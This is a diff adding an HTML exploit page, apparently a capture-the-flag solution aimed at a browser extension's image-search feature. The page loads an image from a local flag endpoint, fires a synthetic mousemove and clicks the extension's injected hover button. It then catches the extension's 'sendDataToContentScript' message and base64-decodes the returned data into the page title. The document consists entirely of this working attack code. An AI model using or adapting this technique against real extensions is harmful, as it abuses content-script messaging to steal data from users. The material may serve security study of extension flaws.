@@ -1,0 +1,20 @@
+<title></title>
+
+<body style="margin: 0; padding: 0;">
+  <img src="http://127.0.1.14:1919/print_flag" style="width: 100vw; height: 100vh;" />
+  <script>
+    window.addEventListener("sendDataToContentScript", (event) => {
+      document.title = atob(event.detail.message.split("base64,")[1]);
+    });
+
+    setTimeout(() => {
+      document.body.dispatchEvent(new MouseEvent("mousemove", {
+        bubbles: true,
+        cancelable: true,
+        view: window,
+      }));
+      document.querySelector(".index-module__imgSearch_hover_content--c5JEb").click();
+    }, 1000);
+  </script><!--
+EOF
+-->
